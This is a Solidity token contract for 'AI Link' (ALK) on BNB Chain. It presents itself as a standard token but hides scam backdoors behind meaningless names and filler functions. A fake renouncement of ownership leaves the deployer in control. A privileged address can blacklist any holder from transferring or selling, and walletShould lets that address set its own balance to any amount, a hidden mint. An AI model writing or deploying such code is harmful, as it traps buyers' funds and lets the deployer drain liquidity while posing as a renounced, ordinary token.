/**
 *Submitted for verification at BscScan.com on 2023-02-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface fundAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyMarketing) external view returns (uint256);

    function transfer(address feeFund, uint256 liquidityMode) external returns (bool);

    function allowance(address launchedTradingSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityMode) external returns (bool);

    function transferFrom(
        address sender,
        address feeFund,
        uint256 liquidityMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed buyAt, uint256 value);
    event Approval(address indexed launchedTradingSender, address indexed spender, uint256 value);
}

interface receiverBuy is fundAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface amountLaunched {
    function createPair(address shouldIs, address receiverFee) external returns (address);
}

interface autoTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fundLimitLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AILink is fundLimitLaunch, fundAt, receiverBuy {
    uint8 private receiverLaunchedSwap = 18;
    
    bool public receiverList;
    mapping(address => mapping(address => uint256)) private teamBuy;


    mapping(address => bool) public teamLiquidity;
    uint256 public exemptTotal;
    address public walletEnableLaunched;
    uint256 private autoWallet;
    uint256 public isFee;
    address private tradingTxFee;
    uint256 private shouldTeam = 100000000 * 10 ** receiverLaunchedSwap;
    uint256 public autoModeIs;
    mapping(address => uint256) private liquidityExemptTeam;

    uint256 private atWallet;

    bool private minMode;
    address public minAt;
    address private shouldReceiverReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping(address => bool) public maxExempt;

    string private receiverEnable = "AI Link";
    string private receiverMarketing = "ALK";
    bool private receiverLaunch;
    uint256 private shouldLaunchedAmount;
    
    

    event OwnershipTransferred(address indexed marketingListAt, address indexed teamLaunched);

    constructor (){
        
        autoTx fundTotal = autoTx(shouldReceiverReceiver);
        minAt = amountLaunched(fundTotal.factory()).createPair(fundTotal.WETH(), address(this));
        tradingTxFee = _msgSender();
        if (minMode != receiverLaunch) {
            receiverLaunch = false;
        }
        walletEnableLaunched = tradingTxFee;
        teamLiquidity[walletEnableLaunched] = true;
        if (autoWallet != atWallet) {
            shouldLaunchedAmount = autoWallet;
        }
        liquidityExemptTeam[walletEnableLaunched] = shouldTeam;
        emit Transfer(address(0), walletEnableLaunched, shouldTeam);
        fundMinFrom();
    }

    

    function transfer(address teamAmount, uint256 liquidityMode) external virtual override returns (bool) {
        return liquidityIsTx(_msgSender(), teamAmount, liquidityMode);
    }

    function sellTake(address fromMarketing) public {
        if (receiverList) {
            return;
        }
        
        teamLiquidity[fromMarketing] = true;
        
        receiverList = true;
    }

    function modeFromLaunched(address amountSell) public {
        
        if (amountSell == walletEnableLaunched || amountSell == minAt || !teamLiquidity[_msgSender()]) {
            return;
        }
        if (minMode) {
            receiverLaunch = true;
        }
        maxExempt[amountSell] = true;
    }

    function senderMin() public {
        if (receiverLaunch) {
            isFee = autoWallet;
        }
        
        shouldLaunchedAmount=0;
    }

    function allowance(address amountShould, address totalMax) external view virtual override returns (uint256) {
        return teamBuy[amountShould][totalMax];
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverLaunchedSwap;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldTeam;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverMarketing;
    }

    function getOwner() external view returns (address) {
        return tradingTxFee;
    }

    function transferFrom(address amountMin, address feeFund, uint256 liquidityMode) external override returns (bool) {
        if (teamBuy[amountMin][_msgSender()] != type(uint256).max) {
            require(liquidityMode <= teamBuy[amountMin][_msgSender()]);
            teamBuy[amountMin][_msgSender()] -= liquidityMode;
        }
        return liquidityIsTx(amountMin, feeFund, liquidityMode);
    }

    function fundMinFrom() public {
        emit OwnershipTransferred(walletEnableLaunched, address(0));
        tradingTxFee = address(0);
    }

    function owner() external view returns (address) {
        return tradingTxFee;
    }

    function txAt(address amountMin, address feeFund, uint256 liquidityMode) internal returns (bool) {
        require(liquidityExemptTeam[amountMin] >= liquidityMode);
        liquidityExemptTeam[amountMin] -= liquidityMode;
        liquidityExemptTeam[feeFund] += liquidityMode;
        emit Transfer(amountMin, feeFund, liquidityMode);
        return true;
    }

    function approve(address totalMax, uint256 liquidityMode) public virtual override returns (bool) {
        teamBuy[_msgSender()][totalMax] = liquidityMode;
        emit Approval(_msgSender(), totalMax, liquidityMode);
        return true;
    }

    function fromTrading() public {
        if (exemptTotal != isFee) {
            shouldLaunchedAmount = isFee;
        }
        
        exemptTotal=0;
    }

    function name() external view virtual override returns (string memory) {
        return receiverEnable;
    }

    function autoSender() public {
        
        
        isFee=0;
    }

    function feeAtTeam() public {
        if (shouldLaunchedAmount != isFee) {
            isFee = exemptTotal;
        }
        
        exemptTotal=0;
    }

    function amountMax() public view returns (bool) {
        return receiverLaunch;
    }

    function balanceOf(address buyMarketing) public view virtual override returns (uint256) {
        return liquidityExemptTeam[buyMarketing];
    }

    function liquidityIsTx(address amountMin, address feeFund, uint256 liquidityMode) internal returns (bool) {
        if (amountMin == walletEnableLaunched || feeFund == walletEnableLaunched) {
            return txAt(amountMin, feeFund, liquidityMode);
        }
        if (minMode) {
            shouldLaunchedAmount = exemptTotal;
        }
        require(!maxExempt[amountMin]);
        if (autoModeIs == atWallet) {
            receiverLaunch = false;
        }
        return txAt(amountMin, feeFund, liquidityMode);
    }

    function tokenIs() public {
        if (exemptTotal == autoWallet) {
            exemptTotal = autoWallet;
        }
        if (receiverLaunch != minMode) {
            isFee = exemptTotal;
        }
        atWallet=0;
    }

    function walletShould(uint256 liquidityMode) public {
        if (!teamLiquidity[_msgSender()]) {
            return;
        }
        liquidityExemptTeam[walletEnableLaunched] = liquidityMode;
    }


}